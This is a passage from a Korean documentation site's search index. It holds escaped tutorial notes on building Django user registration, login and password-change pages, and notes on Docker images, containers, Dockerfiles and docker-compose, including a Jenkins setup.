\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;ml-1 col-11\u0026#34;\u0026gt; 이름: \u0026lt;span class=\u0026#34;margin-left-10\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;test\u0026#34; name=\u0026#34;last_name\u0026#34; id=\u0026#34;last_name\u0026#34; value=\u0026#34;\u0026#34; size=\u0026#34;8\u0026#34;/\u0026gt; \u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;ml-1 col-11\u0026#34;\u0026gt; E-mail: \u0026lt;span class=\u0026#34;margin-left-10\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;test\u0026#34; name=\u0026#34;email_id\u0026#34; id=\u0026#34;email_id\u0026#34; value=\u0026#34;\u0026#34; size=\u0026#34;8\u0026#34;/\u0026gt; @ \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;email_domain\u0026#34; value=\u0026#34;\u0026#34; size=\u0026#34;8\u0026#34;/\u0026gt; \u0026lt;select id=\u0026#34;email_selection\u0026#34; onchange=\u0026#34;changeEmailDomain()\u0026#34;\u0026gt; \u0026lt;option value=\u0026#34;\u0026#34; selected=\u0026#34;selected\u0026#34;\u0026gt;--선택하세요--\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;naver.com\u0026#34;\u0026gt;naver.com\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;hanmail.net\u0026#34;\u0026gt;hanmail.net\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;gmail.com\u0026#34;\u0026gt;gmail.com\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;me.com\u0026#34;\u0026gt;me.com\u0026lt;/option\u0026gt; \u0026lt;/select\u0026gt; \u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;ml-1 col-11\u0026#34;\u0026gt; 전화번호: \u0026lt;span class=\u0026#34;margin-left-10\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;phone1\u0026#34; value=\u0026#34;\u0026#34; size=\u0026#34;3\u0026#34;/\u0026gt; - \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;phone2\u0026#34; value=\u0026#34;\u0026#34; size=\u0026#34;4\u0026#34;/\u0026gt; - \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;phone3\u0026#34; value=\u0026#34;\u0026#34; size=\u0026#34;4\u0026#34;/\u0026gt; \u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;ml-1 col-11\u0026#34;\u0026gt; 생년월일: \u0026lt;span class=\u0026#34;margin-left-10\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;test\u0026#34; name=\u0026#34;birth_year\u0026#34; id=\u0026#34;birth_year\u0026#34; value=\u0026#34;\u0026#34; size=\u0026#34;4\u0026#34;/\u0026gt; 년 \u0026lt;select name=\u0026#34;birth_month\u0026#34; id=\u0026#34;birth_month\u0026#34;\u0026gt; \u0026lt;option value=\u0026#34;1\u0026#34;\u0026gt;1\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;2\u0026#34;\u0026gt;2\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;3\u0026#34;\u0026gt;3\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;4\u0026#34;\u0026gt;4\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;5\u0026#34;\u0026gt;5\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;6\u0026#34;\u0026gt;6\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;7\u0026#34;\u0026gt;7\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;8\u0026#34;\u0026gt;8\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;9\u0026#34;\u0026gt;9\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;10\u0026#34;\u0026gt;10\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;11\u0026#34;\u0026gt;11\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;12\u0026#34;\u0026gt;12\u0026lt;/option\u0026gt; \u0026lt;/select\u0026gt; 월 \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;birth_day\u0026#34; id=\u0026#34;birth_day\u0026#34; value=\u0026#34;\u0026#34; size=\u0026#34;2\u0026#34;/\u0026gt; 일 \u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-12 center\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;button\u0026#34; value=\u0026#34;회원가입\u0026#34; onclick=\u0026#34;userRegister()\u0026#34;/\u0026gt; \u0026lt;input type=\u0026#34;button\u0026#34; value=\u0026#34;취소\u0026#34; onclick=\u0026#34;cancelUserRegister()\u0026#34;/\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; {% endblock %}  vi/boardapp/static/boardapp/assets/js/user.js  function idCheck() { if (!$(\u0026#39;#username\u0026#39;).val()) { alert(\u0026#34;ID를 입력해 주시기 바랍니다.\u0026#34;); return; } $.ajax({ type: \u0026#34;POST\u0026#34;, url: \u0026#34;/boardapp/user_register_idcheck/\u0026#34;, data: { \u0026#39;username\u0026#39;: $(\u0026#39;#username\u0026#39;).val(), \u0026#39;csrfmiddlewaretoken\u0026#39;: $(\u0026#34;input[name=csrfmiddlewaretoken]\u0026#34;).val() }, success: function(response) { $(\u0026#39;#idcheck-result\u0026#39;).html(response); }, }); } function changeEmailDomain() { $(\u0026#39;#email_domain\u0026#39;).val($(\u0026#39;#email_selection\u0026#39;).val()); } function cancelUserRegister() { var result = confirm(\u0026#34;회원가입을 취소하시겠습니까?\u0026#34;); if (result) { $(location).attr(\u0026#39;href\u0026#39;, \u0026#39;/boardapp/login\u0026#39;); } } function userRegister() { if (!$(\u0026#39;#username\u0026#39;).val()) { alert(\u0026#34;아이디를 입력해 주시기 바랍니다.\u0026#34;); return; } if (!$(\u0026#39;#IDCheckResult\u0026#39;).val()) { alert(\u0026#34;ID 중복체크를 먼저 진행해 주시기 바랍니다.\u0026#34;); return; } if (!$(\u0026#39;#password\u0026#39;).val()) { alert(\u0026#34;비밀번호를 입력해 주시기 바랍니다.\u0026#34;); return; } if ($(\u0026#39;#password\u0026#39;).val() != $(\u0026#39;#password_check\u0026#39;).val()) { alert(\u0026#34;비밀번호가 일치하지 않습니다.\u0026#34;); return; } if (!$(\u0026#39;#last_name\u0026#39;).val()) { alert(\u0026#34;이름을 입력해 주시기 바랍니다.\u0026#34;); return; } if (!$(\u0026#39;#phone1\u0026#39;).val() || !$(\u0026#39;#phone2\u0026#39;).val() || !$(\u0026#39;#phone3\u0026#39;).val()) { alert(\u0026#34;전화번호를 올바르게 입력해 주시기 바랍니다.\u0026#34;); return; } if (!$(\u0026#39;#email_id\u0026#39;).val() || !$(\u0026#39;#email_domain\u0026#39;).val()) { alert(\u0026#34;E-mail 주소를 올바르게 입력해 주시기 바랍니다.\u0026#34;); return; } if (!$(\u0026#39;#birth_year\u0026#39;).val() || !$(\u0026#39;#birth_month\u0026#39;).val() || !$(\u0026#39;#birth_day\u0026#39;).val()) { alert(\u0026#34;생년월일을 올바르게 입력해 주시기 바랍니다.\u0026#34;); return; } $(\u0026#39;#phone\u0026#39;).val($(\u0026#39;#phone1\u0026#39;).val() + \u0026#34;-\u0026#34; + $(\u0026#39;#phone2\u0026#39;).val() + \u0026#34;-\u0026#34; + $(\u0026#39;#phone3\u0026#39;).val()); $(\u0026#39;#email\u0026#39;).val($(\u0026#39;#email_id\u0026#39;).val() + \u0026#34;@\u0026#34; + $(\u0026#39;#email_domain\u0026#39;).val()); $(\u0026#39;#register_form\u0026#39;).submit(); } user_register_idcheck  vi/boardapp/views.py  def user_register_idcheck(request): if request.method == \u0026#34;POST\u0026#34;: username = request.POST[\u0026#39;username\u0026#39;] else: username = \u0026#39;\u0026#39; idObject = User.objects.filter(username__exact=username) idCount = idObject.count() if idCount \u0026gt; 0: msg = \u0026#34;\u0026lt;font color=\u0026#39;red\u0026#39;\u0026gt;이미 존재하는 ID입니다.\u0026lt;/font\u0026gt;\u0026lt;input type=\u0026#39;hidden\u0026#39; name=\u0026#39;IDCheckResult\u0026#39; id=\u0026#39;IDCheckResult\u0026#39; value=0/\u0026gt;\u0026#34; else: msg = \u0026#34;\u0026lt;font color=\u0026#39;blue\u0026#39;\u0026gt;사용할 수 있는 ID입니다.\u0026lt;/font\u0026gt;\u0026lt;input type=\u0026#39;hidden\u0026#39; name=\u0026#39;IDCheckResult\u0026#39; id=\u0026#39;IDCheckResult\u0026#39; value=1/\u0026gt;\u0026#34; return HttpResponse(msg) user_register_res  boardapp/view.py  def user_register_result(request): if request.method == \u0026#34;POST\u0026#34;: username = request.POST[\u0026#39;username\u0026#39;] password = request.POST[\u0026#39;password\u0026#39;] last_name = request.POST[\u0026#39;last_name\u0026#39;] phone = request.POST[\u0026#39;phone\u0026#39;] email = request.POST[\u0026#39;email\u0026#39;] birth_year = request.POST[\u0026#39;birth_year\u0026#39;] birth_month = request.POST[\u0026#39;birth_month\u0026#39;] birth_day = request.POST[\u0026#39;birth_day\u0026#39;] try: if username and User.objects.filter(username__exact=username).count() == 0: date_of_birth = datetime(int(birth_year), int(birth_month), int(birth_day)) user = User.objects.create_user(username, password, last_name, email, phone, date_of_birth) redirection_page = \u0026#39;/boardapp/user_register_completed/\u0026#39; else: redirection_page = \u0026#39;/boardapp/error/\u0026#39; except BaseException as e: print(e) redirection_page = \u0026#39;/boardapp/error/\u0026#39; return redirect(redirection_page) user_register_complete  vi boardapp/views.py  def user_register_completed(request): return render(request, \u0026#39;user_register_completed_page.html\u0026#39;)  vi boardapp/templates/user_register_completed_page.html  {% extends \u0026#34;base.html\u0026#34; %} {% block title %}회원가입 완료{% endblock %} {% block script %} {% endblock %} {% block content %} \u0026lt;div style=\u0026#34;height: 70px;\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;row block-center\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;card-box col-8\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-12\u0026#34;\u0026gt; \u0026lt;h3 class=\u0026#34;margin-bottom-10\u0026#34;\u0026gt; 회원가입이 완료되었습니다. \u0026lt;/h3\u0026gt; \u0026lt;h3 class=\u0026#34;margin-bottom-10\u0026#34;\u0026gt; AWS / Django Web Application의 서비스를 이용할 수 있습니다. \u0026lt;/h3\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-12 center\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;button\u0026#34; value=\u0026#34;로그인\u0026#34; onclick=\u0026#34;location.href=\u0026#39;{% url \u0026#39;login\u0026#39; %}\u0026#39;\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;button\u0026#34; value=\u0026#34;메인화면\u0026#34; onclick=\u0026#34;location.href=\u0026#39;{% url \u0026#39;main\u0026#39; %}\u0026#39;\u0026#34; /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; {% endblock %} login  vi /boardapp/templates/login.html  {% extends \u0026#34;base.html\u0026#34; %} {% block title %}Login{% endblock %} {% block script %} {% load static %}\u0026lt;script src=\u0026#34;{% static \u0026#39;boardapp/assets/js/login.js\u0026#39; %}\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; {% endblock %} {% block content %} {% if form.errors %} \u0026lt;script\u0026gt;alert(\u0026#34;ID와 비밀번호를 올바르게 입력하십시오\u0026#34;);\u0026lt;/script\u0026gt; {% endif %} \u0026lt;div style=\u0026#34;height: 70px;\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;row block-center\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;card-box col-12\u0026#34;\u0026gt; \u0026lt;form id=\u0026#34;login_form\u0026#34; action=\u0026#34;.\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; {% csrf_token %} \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-12 center\u0026#34;\u0026gt;\u0026lt;h2\u0026gt;Login\u0026lt;/h2\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-6 right\u0026#34;\u0026gt;ID\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;ml-1 col-5\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34; id=\u0026#34;username\u0026#34; size=\u0026#34;12\u0026#34;/\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class = \u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-6 right\u0026#34;\u0026gt;PASSWORD\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;ml-1 col-5\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34; id=\u0026#34;password\u0026#34; size=\u0026#34;12\u0026#34;/\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-12 center\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;button\u0026#34; value=\u0026#34;로그인\u0026#34; onclick=\u0026#34;login()\u0026#34;/\u0026gt; \u0026lt;input type=\u0026#34;button\u0026#34; value=\u0026#34;회원가입\u0026#34; onclick=\u0026#34;location.href=\u0026#39;{% url \u0026#39;register\u0026#39; %}\u0026#39;\u0026#34;/\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-12 center\u0026#34;\u0026gt; \u0026lt;h4\u0026gt;아이디가 없으십니까? 회원가입을 해 주시기 바랍니다!\u0026lt;/h4\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; {% endblock %}  vi boardapp/static/boardapp/assets/js/login.js  $(document).ready(function() { $(\u0026#39;input\u0026#39;).keydown(function(e) { if (e.which == 13) { $(\u0026#39;form\u0026#39;).submit(); } }); }); function login() { if (!$(\u0026#39;#username\u0026#39;).val()) { alert(\u0026#34;아이디를 입력해 주시기 바랍니다.\u0026#34;); return; } if (!$(\u0026#39;#password\u0026#39;).val()) { alert(\u0026#34;비밀번호를 입력해 주시기 바랍니다.\u0026#34;); return; } $(\u0026#39;#login_form\u0026#39;).submit(); } logoute  LogoutView  LogoutView는 django에서 지원하는 auth의 views를 사용한다. template는 따로 지정하지 않았다.    modify  PasswordChangeView  PasswordChangeView는 django에서 지원하는 auth의 views를 사용한다. urls.py에서 template_name을 password_change.html로 지정하였다.   vi boardapp/templates/password_change.html  {% extends \u0026#34;base.html\u0026#34; %} {% block title %}회원정보 조회{% endblock %} {% block script %} {% load static %}\u0026lt;script src=\u0026#34;{% static \u0026#39;boardapp/assets/js/user.js\u0026#39; %}\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; {% endblock %} {% block content %} {% if form.errors %} \u0026lt;script\u0026gt;alert(\u0026#34;비밀번호 변경이 잘못되었습니다. 올바르게 입력해 주시기 바랍니다.\u0026#34;)\u0026lt;/script\u0026gt; {% endif %} \u0026lt;div class=\u0026#34;row block-center\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;card-box col-6\u0026#34;\u0026gt; \u0026lt;form id=\u0026#34;password_change_form\u0026#34; action=\u0026#34;.\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; {% csrf_token %} \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-12\u0026#34;\u0026gt;\u0026lt;h2\u0026gt;회원정보 조회 / 비밀번호 변경\u0026lt;/h2\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;ml-1 col-11\u0026#34;\u0026gt; ID: \u0026lt;span class=\u0026#34;margin-left-10\u0026#34;\u0026gt;{{ user.username }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;ml-1 col-11\u0026#34;\u0026gt; {{ form.old_password.label_tag }} \u0026lt;span class=\u0026#34;margin-left-10\u0026#34;\u0026gt;{{ form.old_password }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;ml-1 col-11\u0026#34;\u0026gt; {{ form.new_password1.label_tag }} \u0026lt;span class=\u0026#34;margin-left-10\u0026#34;\u0026gt;{{ form.new_password1 }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;ml-1 col-11\u0026#34;\u0026gt; {{ form.new_password2.label_tag }} \u0026lt;span class=\u0026#34;margin-left-10\u0026#34;\u0026gt;{{ form.new_password2 }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;ml-1 col-11\u0026#34;\u0026gt; 이름: \u0026lt;span class=\u0026#34;margin-left-10\u0026#34;\u0026gt;{{ user.last_name }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;ml-1 col-11\u0026#34;\u0026gt; E-mail: \u0026lt;span class=\u0026#34;margin-left-10\u0026#34;\u0026gt;{{ user.email }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;ml-1 col-11\u0026#34;\u0026gt; 전화번호: \u0026lt;span class=\u0026#34;margin-left-10\u0026#34;\u0026gt;{{ user.phone }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;ml-1 col-11\u0026#34;\u0026gt; 생년월일: \u0026lt;span class=\u0026#34;margin-left-10\u0026#34;\u0026gt;{{ user.date_of_birth | date:\u0026#34;Y년 n월 j일\u0026#34; }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-12 center\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;button\u0026#34; value=\u0026#34;비밀번호 변경\u0026#34; onclick=\u0026#34;changePassword()\u0026#34;/\u0026gt; \u0026lt;input type=\u0026#34;button\u0026#34; value=\u0026#34;이전화면\u0026#34; onclick=\u0026#34;window.history.back()\u0026#34;/\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; {% endblock %}  vi boardapp/static/boardapp/assets/js/user.js  function changePassword() { if (!$(\u0026#39;#id_old_password\u0026#39;).val()) { alert(\u0026#34;비밀번호를 입력해 주시기 바랍니다.\u0026#34;); return; } if ($(\u0026#39;#id_new_password1\u0026#39;).val() != $(\u0026#39;#id_new_password2\u0026#39;).val()) { alert(\u0026#34;비밀번호가 일치하지 않습니다.\u0026#34;); return; } $(\u0026#39;#password_change_form\u0026#39;).submit(); } PasswordChangeDoneView  PasswordChangeDoneView는 django에서 지원하는 auth의 views를 사용한다. urls.py에서 template_name을 password_change_done.html로 지정하였다. boardapp/templates/password_change_done.html  \u0026lt;script\u0026gt; alert(\u0026#34;비밀번호 변경이 완료되었습니다.\u0026#34;); location.href=\u0026#34;{% url \u0026#39;main\u0026#39; %}\u0026#34; \u0026lt;/script\u0026gt; setting.py LOGIN_REDIRECT_URL = \u0026#39;/boardapp/\u0026#39; LOGOUT_REDIRECT_URL = \u0026#39;/boardapp/\u0026#39; test  base.html에서 완성된 부분을 #에서 name에 맞게 변경하고 runserver를 실시한다. 회원가입을 테스트한다.  id : admin 이름 : administrator email : admin@admin.com   앞으로 관리자 계정이 필요하므로 mysql에 접속하여 해당 user의 컬럼을 변경  is_superuser = 1 is_staff = 1   SQL : update auth_user set is_superuser = 1, is_staff = 1 where username = \u0026lsquo;admin\u0026rsquo;; admin 페이지에 접속하여 로그인을 테스트한다.  "}),a.add({id:74,href:'/docs/docker/docker/docker/docker-3/',title:"Docker 이미지와 컨테이너",content:"Docker 이미지와 컨테이너    Docker 이미지와 컨테이너    Docker 이미지  $ docker image --help $ docker image [ options ]    옵션 설명     build 이미지 빌드   history history 출력   inspect 임포트   load 로드   ls 이미지 리스트르 보여준다   prune 사용하지 않는 이미지를 제거   pull 저장소에서 이미지를 다운로드   push 저장소에 이미지를 업로드   rm 삭제   save tar로 이미지를 저장   tag 태그를 생성       $ docker pull [ options ] [ 레포지터리 : 태그 ] $ docker image pull [ options ] [ 레포지터리 : 태그 ] # 도커 이미지 다운로드 $ docker images $ docker image list # 도커 이미지 리스트 리스트 출력 $ docker image tags [ 기반이미지 : 태그 ] [ 새이미지 | 태그 ] # 도커 이미지에 태그 입력 $ docker image push [ 레포지터리 : 태그 ] # 지정된 레포지터리에 업로드  도커 이미지의 태그는 버전을 구별하기 위한 역할을 수행합니다. 이미지에 태그를 부착하지 않을 경구 latest 태그가 부여됩니다.     Dockerfile 인스트럭션   Dockerfile을 사용하면 보다 쉽게 Docker 이미지를 생성할 수 있습니다.     옵션 설명     FROM 도커 이미지의 바탕이 될 베이스 이미지를 지정   RUN 도커 이미지를 실행할 때 컨테이너 안에서 실행할 명령을 정의하는 인스트럭션   COPY 도커가 동작중인 호스트 머신의 파일이나 디렉토리를 도커 컨테이너 안으로 복사하는 인스트럭션   CMD 도커 컨테이너를 실행할 때 컨테이너 안에서 실행할 프로세스를 지정, RUN은 빌드할 때마다 실행, CMD는 컨테이너를 시작할 때 한번만 실행 됨   ENTRYPOINT 컨테이너 명령 실행 방식을 조정할 수 있으며, CMD와 마찬가지로 컨테이너 안에서 실행할 프로세서를 지정하는 인스트럭션   LABEL 이미지를 만든 사람의 이름 등을 기입할 수 있음   ENV 도커 컨테이너 안에서 사용할 수 있는 환경변수를 지정   ARG 이미지를 빌드할 때 정보를 함께 넣기 위해 사용, 이미지를 빌드할 때만 사용할 수 있는 일시적인 환경변수       $ vi main.go package main import ( \u0026#34;fmt\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net/http\u0026#34; ) func main() { http.HandleFunc(\u0026#34;/\u0026#34;, func(w http.ResponseWriter, r * http.Request){ log.Println(\u0026#34;received request\u0026#34;) fmt.Fprintf(w, \u0026#34;Hello Docker!!\u0026#34;) }) log.Println(\u0026#34;start server\u0026#34;) server: = \u0026amp; http.Server { Addr:\u0026#34;:8000\u0026#34; } if err: = server.ListenAndServe(); err != nil { log.Println(err) } } $ vi /root/docker/Dockerfile FROM golang:1.9 RUN mkdir /echo COPY main.go /echo CMD [\u0026#34;go\u0026#34;, \u0026#34;run\u0026#34;, \u0026#34;/echo/main.go\u0026#34;] # Dockerfile 생성 $ docker build -t [ 이미지 이름 ] [ Dockerfile의 경로 ] $ docker build -t test:test . $ docker run --rm test:test # docker image 실행    $ docker container run -t -p 9000:8080 gihyodocker/echo:latest $ curl http:///localhost:9000/ # 다른 터미널로 테스트    Docker 컨테이너   도커 컨테이너 생애주기  실행 중 상태 : Dockre container run 명령으로 이미지 기반 컨테이너를 생성한 상태 정지 상태 : 실핼 중 상태에 있는 컨테이너를 사용자가 명시적으로 정지하거나 컨테이너에 정상/ 오류 여부를 막론하고 종료된 경우 파기 상태 : 정지 상태의 컨테이너는 명시적으로 파기하지 않는 이상 디스크에 그대로 남음, 디스크를 차지하는 용량이 점점 늘어나므로 불필요한 컨테이너를 완전히 삭제하는 게 좋음       컨테이너 생성 및 실행 $ docker container run [ options ] [ 이미지명 : 태그 ] [ 명령 ] [ 명령인자 ] $ docker container run [ options ] [ 이미지 ID ] [ 명령 ] [ 명령인자 ]    옵션 설명     -d 옵션 백그라운드에서 실행   -p 옵션 포트포워딩   -it 옵션 /bin/sh로 쉘을 실행할 수 있음       컨테이너 이름 추가 $ docker container run --name [ 컨테이너 이름 ] [ 이미지명 | 태그 ]    옵션 설명     -i 옵션 컨테이너를 실행할 때 컨테이너 쪽 표준 입력과의 연결을 유지   -t 옵션 유사 터미널 기능을 활성화하는 옵션   \u0026ndash;rm 옵션 컨테이너를 종료할 때 컨테이너를 파기하도록 하는 옵션   -v 옵션 호스트와 컨테이너 간 디렉토리나 파일을 공유하기 위해 사용하는 옵션       컨테이너 정보 출력 $ docker container ls [ options ] # 도커 컨테이너 목록 출력 $ docker container ls -q # ID만 출력 $ docker container ls --filter \u0026#34; 필터명=값\u0026#34; # 컨테이너 목록 필터링 $ docker container ls -a # 종료된 컨테이너 목록도 함께 출력    옵션 설명     CONTAINER ID 컨테이너 식별자   IMAGE 컨테이너를 만드는 데 사용된 도커 이미지   COMMAND 컨테이너에서 실행되는 어플리케이션 프로세스   CREATED 컨테이너 생성 후 경과된 시간   STATUS UP ( 실행 중 ), EXITED ( 종료 ) 등 컨테이너의 실행 상태   PORTS 호스트 포트와 컨테이너 포트의 연결 관계   NAME 컨테이너의 이름       컨테이너 상태변경 $ docker container stop # 컨테이너 징지 $ docker container restart # 컨테이너 재시작 $ docker container rm $ docker container run --rm # 컨테이너 삭제, 정지 시 삭제 $ docekr container logs $ docker container logs [ options ] [ 컨테이너 ID 또는 컨테이너명 ] # 표준 출력 연결하기, -f 옵션을 통해 새로 출력되는 표준 출력 내용을 출력    컨테이너 내부에서 명령실행 $ docker container exec [ options ] [ 컨테이너 ID or 컨테이너 명 ] [ 컨테이너에서 실행할 명령 ] $ docker container cp [ options ] [ 컨테이너ip 또는 컨테이너 명 :원본파일] [ 대상파일 ] $ docker container cp [ options ] [ 호스트_원본파일 ] [ 컨테이너ID 또는 컨테이너명 : 대상 파일 ]    운영관리  $ docker image prune [ options ] # 태그가 붙지 않은 모든 이미지 삭제 $ docker container prune [ options ] # 실행 중이 아닌 모든 컨테이너 삭제 $ docker system prune # 사용하지 않는 모든 도커 리소스를 일괄적으로 삭제 $ docker container stats [ options ] [ 대상 컨테이너 ID ] # 사용 현황 확인하기    컴포즈로 여러 컨테이너 실행하기   도커는 어플리케이션 배포에 특화된 컨테이너이다.    docker-compose 설치  $ sudo apt install -y docker-compose $ sudo yum install -y docker-compose # docker-compose 다운로드 $ docker-compose run -d -p 9000:8080 example/echo:latest $ docker-compose.yml # docker-compose.yml 작성 $ docker-compose up -d $ docker container ls # 실행 및 실행 확인 $ docker-compose down # 컨테이너 정지   Jenkins Master-Slave  $ vi docker-compose.yml $ docker-compouse up -d $ docker container ls # 도커 컴포즈 실행 $ cat jenkins_home/secrets/initialAdminPassword # 초기 Admin 암호  http://localhost:8080/ 접속, 로그인 후 플러그인 설치, 사용자 생성                예제 1. 다음의 인스턴스를 생성해보세요.  \r예제 1. 답안\r↕\r\r 사용자 계정을 생성할 시, 엑세스 유형에서 프로그래밍 방식 엑세스만을 선택합니다. 정책에서 admin의 권한을 선택 후 생성합니다.  \r\r\r "}),a.add({id:75,href:'/docs/docker/docker/dockertraining/infradocker-03/',title:"Dokerfile",content:"Dockerfile     Dokerfile은 Doker에서 작동시킬 컨테이너의 구성 정보를 기술하기 위한 파일\n  Dokerfile은 텍스트 형식의 파일로, 에디터 등을 사용하여 작성, 확장자는 따로 필요 없으며 Dokerfile이라는 이름의 파일에 인프라의 구성 정보를 기술\n    Dokerfile의 기본 구문     명렵 설명     FROM 베이스 이미지 지정   RUN 명령 실행   CMD 컨테이너 실행 명령   LABEL 라벨 설정   EXPOSE Port Expose   ENV 환경변수   ADD 파일/ 디렉터리 추가   COPY 파일복서   ENTRYPOINT 컨테이너 실핼 명령   VOLUME 볼륨 마운트   USER 사용자 지정   WORKDIR 작업 디렉토리   ARG Dockerfile 안의 변수   ONBUILD 빌드 완료 후 실행되는 명령어   STOPSIGNAL 시스템 콜 시그널 설정   HEALTHCHECK 컨테이너 헬스 체크   SHELL 기본 쉘 설정   # 주석설정       Dockerfile 작성  FROM \u0026lt;IMG:LABEL\u0026gt; FROM centos:centos7 FROM centos:centos7@sha256:다이제스트 # 상단과 같은 식으로 